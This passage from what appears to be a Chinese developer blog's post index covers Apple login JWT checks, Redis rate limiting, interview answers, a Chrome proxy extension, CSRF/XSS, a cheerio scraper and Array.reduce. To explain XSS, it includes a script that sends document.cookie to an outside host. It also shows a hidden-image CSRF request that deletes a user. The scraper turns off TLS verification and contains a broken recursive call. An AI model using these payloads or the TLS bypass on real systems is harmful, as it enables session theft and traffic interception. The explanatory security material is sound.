keys;\n\n    @Data\n    public static class Item{\n\n        private String kty;\n\n        private String kid;\n\n        private String use;\n\n        private String alg;\n\n        private String n;\n\n        private String e;\n\n    }\n\n}\n\n```\n\n`校验工具类：`\n```java\nimport com.alibaba.fastjson.JSON;\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.JWTVerifier;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport com.auth0.jwt.exceptions.JWTVerificationException;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport jodd.http.HttpRequest;\nimport lombok.extern.slf4j.Slf4j;\nimport sun.security.rsa.RSAPublicKeyImpl;\n\nimport java.io.IOException;\nimport java.math.BigInteger;\nimport java.security.InvalidKeyException;\nimport java.util.List;\n\n@Slf4j\npublic class JWTUtil {\n\n    private static final String ISSUER = \"https://appleid.apple.com\";\n\n    private static final String AUDIENCE = \"这里填写,app bundle id\";\n\n    private static final String APPLE_AUTH_KEYS_URL = \"https://appleid.apple.com/auth/keys\";\n\n    public static Boolean verifyAppleLoginToken(String token,String subject) throws IOException {\n        //先从token中解析出HEADER部分的kid，然后从苹果提供的公钥获取url中获取生成rsa公钥所需的n和e\n        DecodedJWT decodedJWT = JWT.decode(token);\n        String kid = decodedJWT.getHeaderClaim(\"kid\").asString();\n        String response = HttpRequest.get(APPLE_AUTH_KEYS_URL).send().body();\n        List<AppleAuthKeys.Item> keyList = JSON.parseObject(response, AppleAuthKeys.class).getKeys();\n        String n = null, e = null;\n        for (AppleAuthKeys.Item item : keyList) {\n            if (item.getKid().equals(kid)) {\n                n = item.getN();\n                e = item.getE();\n            }\n        }\n        if (null == n || null == e) {\n            log.error(\"根据token解析出来的kid获取苹果公钥参数n和e失败,token:{}\", token);\n            return false;\n        }\n        //各个版本的base64解码实现不太一样，目前发现只有apache的base64可以解析成功\n        BigInteger bigIntModulus = new BigInteger(1, org.apache.commons.codec.binary.Base64.decodeBase64(n));\n        BigInteger bigIntPrivateExponent = new BigInteger(1, org.apache.commons.codec.binary.Base64.decodeBase64(e));\n        try {\n            //使用生成的RSA公钥验证token的SIGNATURE部分是否合法，(同时验证ISSUER,SUBJECT,AUDIENCE是否合法)\n            RSAPublicKeyImpl rsaPublicKey = new RSAPublicKeyImpl(bigIntModulus, bigIntPrivateExponent);\n            Algorithm algorithm = Algorithm.RSA256(rsaPublicKey, null);\n            JWTVerifier verifier = JWT.require(algorithm)\n                    .withIssuer(ISSUER)\n                    .withSubject(subject)\n                    .withAudience(AUDIENCE)\n                    .build();\n            DecodedJWT jwt = verifier.verify(token);\n        } catch (JWTVerificationException ex1) {\n            log.error(\"苹果token检验失败,失败原因:{},token:{}\", ex1.getMessage(), token);\n            return false;\n        } catch (InvalidKeyException ex2) {\n            log.error(\"苹果token检验失败,公钥生成失败,失败原因:{},token:{}\", ex2.getMessage(), token);\n            return false;\n        }\n        log.info(\"苹果登录token校验成功,n:{},e:{},token:{}\", n, e, token);\n        return true;\n    }\n\n    public static void main(String[] args) throws IOException {\n        verifyAppleLoginToken(\"待验证的苹果登录token\",\"待验证的用户唯一ID\");\n    }\n\n}\n```\n\n### nodejs版本\n```javascript\nconst NodeRSA = require(\"node-rsa\");\nconst axios = require(\"axios\");\nconst jwt = require(\"jsonwebtoken\");\n\nasync function getApplePublicKey(kid) {\n  let res = await axios.request({\n    method: \"GET\",\n    url: \"https://appleid.apple.com/auth/keys\",\n    headers: {\n      \"Content-Type\": \"application/json\"\n    }\n  });\n  let key = res.data.keys.filter(item => item.kid == kid)[0];\n  console.log(key);\n  const pubKey = new NodeRSA();\n  pubKey.importKey(\n    { n: Buffer.from(key.n, \"base64\"), e: Buffer.from(key.e, \"base64\") },\n    \"components-public\"\n  );\n  return pubKey.exportKey([\"public\"]);\n}\n\nconst audience = \"这里填写 app bundle id\";\n\nasync function verifyIdToken(token,subject) {\n  const kid = jwt.decode(token, { complete: true }).header.kid;\n  const applePublicKey = await getApplePublicKey(kid);\n  console.log(applePublicKey);\n  const jwtClaims = jwt.verify(token, applePublicKey, {\n    algorithms: \"RS256\",\n    issuer: \"https://appleid.apple.com\",\n    audience: audience,\n    subject: subject\n  });\n  jwt.verify(token, applePublicKey, { algorithms: \"RS256\" }, (err, decode) => {\n    if (err) {\n      console.log(\"token验证失败:\", err.message);\n    } else if (decode) {\n      console.log(\"token验证成功：\", decode);\n    }\n  });\n}\n\nverifyIdToken(\"待验证的token\",\"用户唯一ID\");\n\n```\n"},{"title":"基于Redis的限流","url":"/2020/05/24/基于Redis的限流/","content":"\n\n以下代码演示同一个IP在30秒内只能获取一次验证码：\n\n\n**限流类型枚举**\n\n```java\npublic enum LimitType {\n    //自定义限流\n    CUSTOMER,\n    //手机号限流\n    MOBILE,\n    //IP限流\n    IP;\n}\n```\n\n**定义限流注解**\n\n```java\n/**\n * 控制一个接口在指定时间内被访问次数限制\n */\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Limit {\n\n    // 资源名称，用于描述接口功能\n    String name() default \"\";\n\n    // 资源 key\n    String key() default \"\";\n\n    // redis中key的前缀\n    String prefix() default \"\";\n\n    // 时间的，单位秒\n    int period();\n\n    // 限制访问次数\n    int count();\n\n    // 限制类型\n    LimitType limitType() default LimitType.CUSTOMER;\n}\n\n```\n\n\n**使用Spring的Aspect拦截具有Limit注解的接口**\n```java\n@Slf4j\n@Aspect\n@Component\npublic class LimitAspect {\n\n    private final RedisTemplate<String, Serializable> limitRedisTemplate;\n\n    @Autowired\n    public LimitAspect(RedisTemplate<String, Serializable> limitRedisTemplate) {\n        this.limitRedisTemplate = limitRedisTemplate;\n    }\n\n    @Pointcut(\"@annotation(com.dpqwl.xunmishijie.common.annotation.Limit)\")\n    public void pointcut() {\n        // 拦截所有具有limit注解的bean\n    }\n\n    @Around(\"pointcut()\")\n    public Object around(ProceedingJoinPoint point) throws Throwable {\n        HttpServletRequest request = ((ServletRequestAttributes) \n            Objects.requireNonNull(RequestContextHolder.getRequestAttributes())).getRequest();\n        MethodSignature signature = (MethodSignature) point.getSignature();\n        Method method = signature.getMethod();\n        Limit limitAnnotation = method.getAnnotation(Limit.class);\n        LimitType limitType = limitAnnotation.limitType();\n        String name = limitAnnotation.name();\n        String key;\n        String ip = IPUtil.getIpAddr(request);\n        int limitPeriod = limitAnnotation.period();\n        int limitCount = limitAnnotation.count();\n        //判断限流的类型，可以是IP，手机号，自定义\n        switch (limitType) {\n            case IP:\n                key = ip;\n                break;\n            case CUSTOMER:\n                key = limitAnnotation.key();\n                break;\n            case MOBILE:\n                key=request.getParameter(\"phoneNum\");;\n                break;\n            default:\n                key = StringUtils.upperCase(method.getName());\n        }\n        ImmutableList<String> keys = ImmutableList.of(StringUtils.join(limitAnnotation.prefix() + \"_\", key));\n        String luaScript = buildLuaScript();\n        RedisScript<Number> redisScript = new DefaultRedisScript<>(luaScript, Number.class);\n        Number count = limitRedisTemplate.execute(redisScript, keys, limitCount, limitPeriod);\n        log.info(\"IP:{} 第 {} 次访问key为 {}，描述为 [{}] 的接口\", ip, count, keys, name);\n        if (count != null && count.intValue() <= limitCount) {\n            return point.proceed();\n        } else {\n            throw new LimitAccessException(\"访问频繁,稍后再试\");\n        }\n    }\n\n    /**\n     * 限流脚本\n     * 调用的时候不超过阈值，则直接返回并执行计算器自加。\n     *\n     * @return lua脚本\n     */\n    private String buildLuaScript() {\n        // \\n表示回车换行 ARGV[1]表示参数1：限流次数，ARGV[2]表示参数2：过期时间\n        return \"local c\" +\n                \"\\nc = redis.call('get',KEYS[1])\" +\n                \"\\nif c and tonumber(c) > tonumber(ARGV[1]) then\" +\n                \"\\nreturn c;\" +\n                \"\\nend\" +\n                \"\\nc = redis.call('incr',KEYS[1])\" +\n                \"\\nif tonumber(c) == 1 then\" +\n                \"\\nredis.call('expire',KEYS[1],ARGV[2])\" +\n                \"\\nend\" +\n                \"\\nreturn c;\";\n    }\n\n}\n```\n以上的 **buildLuaScript** 方法，是核心部分，取出对应key的值和限流次数比较（如果key不存在执行redis.call('incr',KEYS[1])会自动设置key并初始化为0再加1）：\n\n- 如果当前次数大于限流次数，直接返回当前次数。\n- 如果当前次数小于限流次数，将当前key值加1，如果当前值为1，表示该时间段内第一次访问，则设置key的过期时间为限流策略的时间值，当key过期之后开始重新计数。\n\n\n**在接口上使用Limit注解**\n```java\n@GetMapping(\"/getCaptcha\")\n@Limit(key = \"captcha\", period = 30, count = 1, name = \"获取验证码\", prefix = \"limit\", limitType = LimitType.IP)\npublic Response getCaptcha(@NotBlank String mobile){\n    //30秒内同一个IP地址只能调用一次该接口\n    return new Response().code(\"000\").data(null).message(\"验证码获取成功!\");\n}\n```\n\n以上限流算法为固定窗口限流算法，其他限流算法可参考：[常见限流算法](https://juejin.cn/post/7209504489010430010)"},{"title":"架构师软能力","url":"/2019/06/27/架构师软能力/","content":"\n\n- 你在过去的项目中的角色和职责是什么 ? 你是如何管理项目的 ?\n\n\n```\n我在过去的项目中担任过开发人员和技术负责人的角色。作为开发人员，我的职责是根据需求完成代码编写和单元测试。\n作为技术负责人，我的职责是制定项目计划，分配任务，协调团队成员之间的合作，确保项目按时交付。\n我管理项目的方式是采用敏捷开发方法，每周召开团队会议，及时跟进项目进展，及时解决问题，确保项目顺利进行。\n```\n\n\n\n\n- 你在设计系统架构时，会考虑哪些方面? 你是如何做决策的 ?\n\n```\n在设计系统架构时，我会考虑以下方面：\n1. 可扩展性：系统应该能够方便地扩展，以应对未来的需求变化。（设计模式之策略模式，插件,SEO微服务等）\n2. 可靠性（高可用）：系统应该具有高可靠性，能够保证数据的安全性和系统的稳定性。（主从，哨兵，集群，热备，削峰，限流，熔断降级等）\n3. 可维护性：系统应该易于维护和升级，以便及时修复漏洞和添加新功能。（策略模式，CICD，Jenkins及K8s等）\n4. 性能：系统应该具有高性能，能够快速响应用户请求。（缓存，负载均衡，读写分离，前后分离，消息队列，全文检索，分库分表等）\n5. 安全性：系统应该具有高安全性，能够保护用户数据和系统资源不受攻击。（ddos，xss，csrf,黑名单等）\n6. 团队成员的技术栈，学习能力，需要的机器成本，人力成本。\n7. 上线时间要求，要求快速上线后期优化的项目，前期可考虑单体模式，后期重构微服务。\n8. 业务量，并发量，未来可能的用户量。\n9. 如果是招标的项目，要考虑甲方的技术青睐。\n\n在做决策时，根据项目需求和技术限制，综合考虑各个方面的因素，制定出最优的系统架构方案。参考业界的最佳实践和经验，以确保系统架构的可行性和可靠性。\n```\n\n\n\n\n\n- 你如何评估和管理技术风险? 你在过去的项目中是如何处理技术风险的 ?\n  \n```\n在评估和管理技术风险时，采取以下措施：\n1. 风险评估：在项目开始之前，会对可能存在的技术风险进行评估，包括可能出现的问题、影响范围、解决方案等，以便及时采取措施。\n2. 风险管理：在项目进行过程中，会定期对可能存在的技术风险进行跟踪和管理，及时采取措施，以确保项目的顺利进行。\n3. 风险应对：在技术风险出现时，会及时采取应对措施，包括调整项目计划、增加资源投入、调整技术方案等，以最大程度地减少风险对项目的影响。\n\n在过去的项目中，我曾经遇到过技术风险，例如系统性能不足、安全漏洞等。针对这些问题，采取了以下措施：\n1. 性能问题：通过优化代码、增加缓存、使用负载均衡等方式，最终解决了性能问题。\n2. 安全漏洞：通过加强安全措施、修复漏洞等方式，最终解决了安全问题。\n\n通过这些经验，我认为及时评估和管理技术风险是非常重要的，只有这样才能确保项目的顺利进行。同时，也需要及时采取应对措施，以最大程度地减少风险对项目的影响。\n\n```\n\n\n\n\n- 你在开发过程中遇到的最大的挑战是什么? 你是如何应对的 ?\n\n```\n在开发过程中遇到的最大挑战是系统性能问题。为了解决性能问题，我们采取了以下措施：\n1. 增加机器：我们增加了机器和手机的数量，以承受更大的流量。\n2. 优化代码：我们对系统的代码进行了优化，减少了不必要的计算和IO操作，提高了系统的响应速度。\n3. 使用缓存：我们使用了缓存技术，将一些常用的数据缓存到内存中，以减少数据库的访问次数，提高系统的响应速度。\n4. 使用负载均衡：我们使用了负载均衡技术，将流量均衡地分配到多台机器上，以提高系统的并发能力。\n\n通过这些措施，我们最终成功地解决了系统性能问题，保证了系统的稳定性和可靠性。这个经验让我认识到，在开发过程中，系统性能是一个非常重要的问题，需要在设计和开发阶段就考虑到，并采取相应的措施。\n```\n\n\n\n- 你如何保持对新技术和新趋势的了解，并将其应用到实践中 ?\n\n```\n我保持对新技术和新趋势的了解的方式有以下几种：\n1. 阅读技术博客和文章：我会定期阅读一些技术博客和文章，了解最新的技术趋势和发展动态，例如微信公众号，掘金等。\n2. 参加技术交流会议：我会参加一些线上技术交流会议，了解业界的最新技术和实践经验，例如腾讯开发者会议等。\n3. 参加技术社区：我会加入一些技术社区，与其他技术人员交流和分享经验，例如 GitHub、知乎等。\n4. 实践项目：我会在实践项目中尝试应用新技术和新趋势，以便更好地理解和掌握它们的优缺点和适用场景。\n5. 学习课程：我会参加一些在线课程和培训，学习最新的技术和实践经验，例如极客时间等。\n\n将新技术和新趋势应用到实践中，我会采取以下措施：\n1. 评估技术的可行性和适用性：在应用新技术和新趋势之前，我会评估其在当前项目中的可行性和适用性，以确保其能够满足项目需求和技术要求。\n2. 逐步应用：我会逐步应用新技术和新趋势，以便更好地掌握其优缺点和适用场景，并及时调整和优化应用方案。\n3. 与团队成员协作：我会与团队成员协作，共同探讨和应用新技术和新趋势，以便更好地提高团队的技术水平和项目的质量。同时，我也会及时分享和总结经验，以便其他团队成员能够更好地了解和掌握新技术和新趋势。\n```\n\n\n\n\n- 你在团队中如何进行沟通和协作 ? 你如何解决团队成员之间的冲突 ?\n\n```\n在团队中，我会采取以下措施进行沟通和协作：\n1. 定期召开会议：我会定期召开团队会议，及时了解项目进展和问题，协调团队成员之间的合作，以确保项目顺利进行。\n2. 使用沟通工具：我会使用一些沟通工具，例如钉钉、微信等，及时与团队成员沟通和交流，以便及时解决问题和协调工作。\n3. 分配任务：我会根据团队成员的技术和能力，合理分配任务，以确保每个人都能够发挥自己的优势，同时也能够提高团队的效率。\n4. 建立良好的团队氛围：我会积极营造良好的团队氛围，鼓励团队成员之间相互支持和帮助，以便更好地协作和完成项目。\n\n在解决团队成员之间的冲突时，我会采取以下措施：\n1. 及时沟通：我会及时与冲突双方进行沟通，了解问题的具体情况和原因，以便更好地解决问题。\n2. 中立公正：我会保持中立公正的态度，不偏袒任何一方，以确保冲突得到公正解决。\n3. 寻求共识：我会与冲突双方一起寻求共识，找到解决问题的最佳方案，以便更好地解决冲突。\n4. 建立规则：我会建立一些规则和制度.\n```\n\n\n\n- 你是否有管理经验? 如果有，你是如何管理团队和协调开发和业务需求的 ?\n\n```\n1. 我通常会与团队成员建立良好的沟通和合作关系，以确保他们理解业务需求并能够按时交付高质量的产品。\n2. 我会定期与团队成员进行会议，以确保他们了解项目的进展情况，并解决任何可能出现的问题。\n3. 我还会与业务部门保持联系，以确保我们的开发工作符合业务需求。如果需要，我会调整开发计划以适应新的业务需求。\n4. 我还会鼓励团队成员提出任何可能改进我们开发流程的建议，并尽力为他们提供支持和资源。\n```\n\n\n- 你是如何衡量和评估项目的成功和失败的 ?你如何处理项目失败和挫折 ?\n\n```\n在衡量和评估项目的成功和失败时，我会考虑以下几个方面：\n1. 项目目标是否达成：项目的目标是什么，是否达成了预期的目标，达成的程度如何。\n2. 项目质量是否达标：项目的交付物是否符合质量标准，是否满足用户需求。\n3. 项目进度是否按计划进行：项目的进度是否按照计划进行，是否存在延期等问题。\n4. 项目成本是否控制在预算范围内：项目的成本是否控制在预算范围内，是否存在超支等问题。\n\n对于项目失败和挫折，我会采取以下措施：\n1. 及时发现问题：在项目执行过程中，及时发现问题，避免问题扩大化。\n2. 分析问题原因：对于出现的问题，进行深入分析，找出问题的根本原因。\n3. 制定解决方案：针对问题原因，制定相应的解决方案，确保问题得到解决。\n4. 学习经验教训：对于项目失败和挫折，总结经验教训，避免类似问题再次发生。\n```\n\n\n"},{"title":"编写Chrome插件","url":"/2019/04/25/编写Chrome插件/","content":"`新建文件夹 simple-porxy,并在文件夹下新建如下文件：`\n- manifest.json（描述文件）\n- background.html（后台运行页面）\n- background.js（后台运行js）\n- on.png （插件图标）\n\n`manifest.json`\n```json\n{\n  \"author\": \"wxj\",\n  \"background\": {\n    \"page\": \"background.html\"\n  },\n  \"browser_action\": {\n    \"default_icon\": \"on.png\",\n    \"default_title\": \"a simple proxy crx\"\n  },\n  \"description\": \"This is a simple proxy crx\",\n  \"manifest_version\": 2,\n  \"name\": \"simple-proxy\",\n  \"short_name\": \"sproxy\",\n  \"permissions\": [\n    \"proxy\"\n  ],\n  \"version\": \"1.0\"\n}\n```\n\n`background.html` \n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <script src=\"background.js\"></script>\n  </head>\n  <body>\n  </body>\n</html>\n```\n\n\n`background.js`\n```javascript\nchrome.proxy.settings.set({\n  value: {\n    mode: 'fixed_servers',\n    rules: {\n      proxyForHttp:{\n        scheme: 'https',\n        host: 'default.px.skyzip.de',\n        port: 443\n      },\n      proxyForHttps: {\n        scheme: 'https',\n        host: 'default.px.skyzip.de',\n        port: 443\n      },\n      bypassList: null\n    }\n  },\n  scope: 'regular'\n});\n```\n上诉代码的`host`来源于`skyZIP Proxy CRX 0.8.3`的源码，使用`winrar`打开下载好的`skyZIP Proxy CRX 0.8.3`，并解压，便可看到chrome插件的源代码。编写完以上三个文件后，打开chrome扩展程序的开发者模式，加载`simple-porxy`文件夹，即可安装插件\n\n![打开chrome扩展程序](/image/3.webp)\n\n![加载扩展程序](/image/4.webp)\n\n\n`注意：`\n\n以上代码实现了请求代理功能，浏览器的所有请求都将被代理至 `default.px.skyzip.de` 服务器，包括你在网页中输入的账号和密码等等。为了安全起见，建议自己购买服务器，并在服务器上安装代理转发工具，然后将 `background.js` 中的 `host` 改为你购买的服务器的IP地址。\n\n另外，使用chrome插件需要注意，某些chrome插件可能会监控用户在网页中的输入信息，包括账号密码等，比如著名的`adblock plus`插件（和adblock是两个不同的插件）就曾被曝出含有木马病毒。\n"},{"title":"JWT与XSS-CSRF攻击","url":"/2019/01/07/JWT与XSS-CSRF攻击/","content":"web服务中，用户输入用户名密码登入之后，后续访问网站的其他功能就不用再输入用户名和密码了。传统的身份校验机制为`cookie-session`机制：\n\n### cookie-session机制\n- `用户浏览器访问web网站，输入用户名密码`\n- `服务器校验用户名密码通过之后，生成sessonid并把sessionid和用户信息映射起来保存在服务器`\n- `服务器将生成的sessionid返回给用户浏览器，浏览器将sessionid存入cookie`\n- `此后用户对该网站发起的其他请求都将带上cookie中保存的sessionid`\n- `服务端把用户传过来的sessionid和保存在服务器的sessionid做对比，如果服务器中有该sessionid则代表身份验证成功`\n\n这种方式存在以下几个问题：\n-   `代码安全机制不完善，可能存在CSRF漏洞`\n- `服务端需要保存sessionid与客户端传来的sessionid做对比，当服务器为集群多机的情况下，需要复制sessionid，在多台集群机器之间共享`\n- `如果需要单点登入，则须将sessionid存入redis等外部存储保证每台机器每个系统都能访问到，如果外部存储服务宕机，则单点登入失效`\n\n### CSRF攻击\n- `用户访问A网站(http://www.aaa.com)，输入用户名密码`\n- `服务器验证通过，生成sessionid并返回给客户端存入cookie`\n- `用户在没有退出或者没有关闭A网站，cookie还未过期的情况下访问恶意网站B`\n- `B网站返回含有如下代码的html：`\n\n```html\n//假设A网站注销用户的url为：https://www.aaa.com/delete_user\n<img src=\"https://www.aaa.com/delete_user\" style=\"display:none;\"/>\n```\n- `浏览器发起对A网站的请求，并带上A网站的cookie，注销了用户`\n\n### JWT认证方式\nJWT全称 `Json Web Token`，是一个长字符串，由三部分组成：`Header(头部)`、 `Payload(负载)`、`Signature(签名)`，`Header.Payload.Signature`，用`.`分割各部分内容，看起来大概就像下面这样：\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InhpYW8gamllIiwiYWRtaW4iOnRydWV9.MjcxZGFjMmQzZjNlMzdjMTU0OGZmM2FlNzFjNDkyMDAwODkzZGNiYmFkODc0MTJhYTYzMTE4MmY0NDBhNzkzZA\n```\n\n\n生成过程如下：\n```\nconst crypto = require(\"crypto\");\nconst base64UrlEncode = require(\"base64url\");\n//头部信息\nvar header = {\n    \"alg\": \"HS256\", //签名算法类型，默认是 HMAC SHA256（写成 HS256）\n    \"typ\": \"JWT\" //令牌类型，JWT令牌统一为JWT\n};\n//负载信息,存储用户信息\nvar payload = {\n    \"sub\": \"1234567890\",\n    \"name\": \"xiao jie\",\n    \"admin\": true\n}\n//服务器秘钥，用于加密生成signature,不可泄漏\nvar secret = \"chaojidamantou\";\n//header部分和payload部分\nvar message = base64UrlEncode(JSON.stringify(header)) + \".\" + base64UrlEncode(JSON.stringify(payload));\n//HMACSHA256加密算法\nfunction HMACSHA256(message, secret) {\n    return crypto.createHmac('sha256', secret).update(message).digest(\"hex\");\n}\n//生成签名信息\nvar signature = HMACSHA256(message, secret);\n//header和payload部分内容默认不加密,也可以使用加密算法加密\nvar JWT = message + \".\" + base64UrlEncode(signature);\nconsole.log(JWT);\n```\n验证过程如下：\n- `用户访问网站，输入账号密码登入`\n- `服务器校验通过，生成JWT，不保存JWT，直接返回给客户端`\n- `客户端将JWT存入cookie或者localStorage `\n- `此后用户发起的请求，都将使用js从cookie或者localStorage读取JWT放在http请求的header中，发给服务端`\n- `服务端获取header中的JWT，用base64URL算法解码各部分内容，并在服务端用同样的秘钥和算法生成signature，与传过来的signature对比，验证JWT是否合法`\n\n使用JWT验证，由于服务端不保存用户信息，不用做sessonid复制，这样集群水平扩展就变得容易了。同时用户发请求给服务端时，前端使用JS将JWT放在header中手动发送给服务端，服务端验证header中的JWT字段，而非cookie信息，这样就避免了CSRF漏洞攻击。\n\n\n不过，无论是cookie-session还是JWT，都存在被XSS攻击盗取的风险：\n\n### XSS攻击\n跨站脚本攻击，其基本原理同sql注入攻击类似。页面上用来输入信息内容的输入框，被输入了可执行代码。假如某论坛网站有以下输入域用来输入帖子内容\n```html\n发帖内容：<textarea rows=\"3\" cols=\"20\"></textarea>\n```\n而恶意用户在textarea发帖内容中填入诸如以下的js脚本：\n```html\n今天很开心，学会了JWT\n<script>\n$.ajax({\n  type: \"post\",\n  url: \"https://www.abc.com/getcookie\",\n  data: {cookie : document.cookie}\n});\n</script>\n```\n那么当其他用户访问该帖子的时候，用户的cookie就会被发送到abc域名的服务器上了。\n\n为了避免xss攻击，客户端和服务端都应该对提交数据进行xss攻击转义。\n"},{"title":"使用cheerio爬取gank-io妹子图","url":"/2018/11/13/使用cheerio爬取gank-io妹子图/","content":"`cheerio`是`nodejs`的抓取页面模块，只需输入`html`，然后就可以像`Jquery`一样获取`dom`结构信息：\n\n```\nconst cheerio = require('cheerio')\nconst $ = cheerio.load('<h2 class=\"title\">Hello world</h2>')\n \n$('h2.title').text('Hello there!')\n$('h2').addClass('welcome')\n \n$.html()\n//=> <html><head></head><body><h2 class=\"title welcome\">Hello there!</h2></body></html>\n```\n\n### `命令终端（空目录下）`\n```\nnpm init（一直回车初始化项目）\nnpm install cheerio --save（安装依赖）\nnode index.js（启动爬取脚本）\n```\n\n\n### `index.js`\n```\n// 加载http模块\nvar https = require('https');\nvar http = require('http');\nvar fs = require('fs');\n// Cheerio 是一个Node.js的库， 它可以从html的片断中构建DOM结构，然后提供像jquery一样的css选择器查询\nvar cheerio = require('cheerio');\n//忽略https证书\nprocess.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n//获取网页信息\nfunction getGank(fileName) {\n    //定义请求地址，请求协议，请求头\n    const options = {\n        hostname: 'gank.io',\n        port: 443,\n        path: '/',\n        method: 'GET',\n        headers: {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'\n        },\n    };\n    https.get(options, function (res) {\n        var html = '';\n        // 获取页面数据\n        res.on('data', function (data) {\n            html += data;\n        });\n        // 数据获取结束\n        res.on('end', function () {\n            var $ = cheerio.load(html);\n            //此处的选择器需要根据网站的更新不断的改变\n            var imgSrc = $(\"div.container.content div.outlink img\").attr(\"src\");\n            var href = $(\"div.container.content div.row div.six.columns\").eq(1).find(\"a\").attr(\"href\");\n            var nextUrl = root + href;\n            var nextFileName = href.replace(/\\//g, \"-\").replace(\"-\", \"\");\n            saveImg(imgSrc, fileName, nextUrl, nextFileName);\n        });\n    }).on('error', function () {\n        console.log('获取数据出错！');\n    });\n}\n//保存图片,需要在index.js所在目录下新建image文件夹\nfunction saveImg(url, fileName, nextUrl, nextFileName) {\n    var protocol;\n    if (url.indexOf(\"https\") != -1) {\n        protocol = https;\n    } else {\n        protocol = http;\n    }\n    protocol.get(url, function (res) {\n        var imgData = \"\";\n        res.setEncoding(\"binary\");\n        res.on(\"data\", function (chunk) {\n            imgData += chunk;\n        });\n        res.on(\"end\", function () {\n            fs.writeFile(\"./image/\" + fileName + \".jpg\", imgData, \"binary\", function (err) {\n                if (err) {\n                    console.log(\"down fail:\" + err);\n                }\n                console.log(\"down success:\" + fileName);\n                getGank(nextUrl, nextFileName);\n            });\n        });\n    });\n}\ngetGank('new');\n```\n\n以上通过分析网页的方式爬取图片，由于部分文章的dom结构比较特殊，无法获取图片，幸运的是该网站也提供API直接获取图片，所以也可以用以下方式获取，无需安装依赖\n\n### `index.js (API方式获取)`\n```\nvar https = require('https');\nvar http = require('http');\nvar fs = require('fs');\n// 定义网络爬虫的目标地址\n//忽略https证书\nprocess.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\nvar data;\n//获取所有图片信息\nfunction getGank() {\n    const options = {\n        hostname: 'gank.io',\n        port: 443,\n        path: '/api/data/%E7%A6%8F%E5%88%A9/1000/1',\n        method: 'GET',\n        headers: {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'\n        },\n    };\n    https.get(options, function (res) {\n        var html = '';\n        // 获取页面数据\n        res.on('data', function (data) {\n            html += data;\n        });\n        // 数据获取结束\n        res.on('end', function () {\n            data = JSON.parse(html).results;\n            console.log(\"图片总数：\" + data.length);\n            saveImg(0);\n        });\n    }).on('error', function () {\n        console.log('获取数据出错！');\n    });\n}\n//保存图片\nfunction saveImg(index) {\n    if (index == data.length) {\n        return;\n    }\n    var url = data[index].url, fileName = data[index].createdAt.replace(/:/g, \"-\");\n    fs.exists(\"./image/\" + fileName + \".jpg\", function (exists) {\n        if (!exists) {\n            var protocol = url.indexOf(\"https\") != -1 ? https : http;\n            protocol.get(url, function (res) {\n                var imgData = \"\";\n                res.setEncoding(\"binary\");\n                res.on(\"data\", function (chunk) {\n                    imgData += chunk;\n                });\n                res.on(\"end\", function () {\n                    fs.writeFile(\"./image/\" + fileName + \".jpg\", imgData, \"binary\", function (err) {\n                        if (err) {\n                            console.log(\"down fail:\" + err);\n                        }\n                        console.log(\"down success:\" + fileName);\n                        saveImg(++index);\n                    });\n                });\n            });\n        }else{\n            saveImg(++index);\n        }\n    });\n}\n\nfs.exists(\"./image\", function (exists) {\n    console.log(\"当前目录是否存在image文件夹：\" + exists);\n    exists ? getGank() : fs.mkdir(\"./image\", function (err) {\n        if (err) {\n            return console.error(err);\n        }\n        console.log(\"目录创建成功。\");\n        getGank();\n    });\n});\n```\n"},{"title":"Array.prototype.reduce()","url":"/2018/10/28/Array-prototype-reduce()/","content":"recude 函数为 js 数组中较难理解的一个函数，其定义如下：\n\n- `定义`\n```javascript\narr.reduce(callback,[initialValue])\n```\n其中callback函数有四个参数：\n- `previousValue` （第一次调用`callback`函数时候，`previousValue`值为`reduce`函数的第二个参数`initialValue`，如果没有`initialValue`则`previousValue`值为数组的第一个元素，`currentValue` 为第二个元素。第二次及以后的`callback`函数调用 `previousValue` 为上一次调用`callback`函数的返回结果）\n- `currentValue` （数组中当前被处理的元素）\n- `index` （当前元素在数组中的索引，一般不用）\n- `array` （调用 reduce 的数组，一般不用）\n\n用一句话来简单的概括就是：\n- reduce函数，为数组中的每一个元素执行callback方法，并将每次callback方法的返回结果，作为下一次调用callback方法的参数 (通常也把这种思想叫做管道机制`pipeline`)\n\nreduce函数常见的使用场景有:\n\n- `数组的累加`\n```javascript\nvar arry = [1, 2, 3, 4, 5, 6, 7];\nvar total = arry.reduce(function(sum, item) {\n    return sum + item; \n}, 0);\nconsole.log(total);\n```\n\n- `计算字符串中各字符的出现次数`\n```javascript\nvar str = 'abcdcbcddacabcdad';\nvar result = str.split('').reduce(function(res, cur) {\n    res[cur] ? res[cur] ++ : res[cur] = 1\n    return res;\n}, {})\nconsole.log(result);\n```\n\n- `管道函数调用`\n```javascript\n//假如有一个流程包含5个步骤，每一步的参数为上一步的执行结果\nvar init = 0;\nfunction step5(arg){return arg + 5;};\nfunction step4(arg){return arg + 4;};\nfunction step3(arg){return arg + 3;};\nfunction step2(arg){return arg + 2;};\nfunction step1(arg){return arg + 1;};\nvar result1  = step5( step4( step3( step2( step1( init ) ) ) ) );\nconsole.log(result1)\n//等价于以下的写法\nvar result2 = [step1,step2,step3,step4,step5].reduce((a, b) => b(a), init);\nconsole.log(result2)\n```\n\n`reduce`为`ES5`中的一个新特性，所有使用`reduce`实现的功能其实都能用`for循环`来实现，一个简单的实现如下：\n```\nArray.prototype.reduce = function(callback, init) {\n\tvar result;\n\tfor(var i = 0 ;i < this.length; i++){\n\t\tresult = i == 0 ? callback(init, this[i]) : callback(result, this[i]);\n\t}\n\treturn 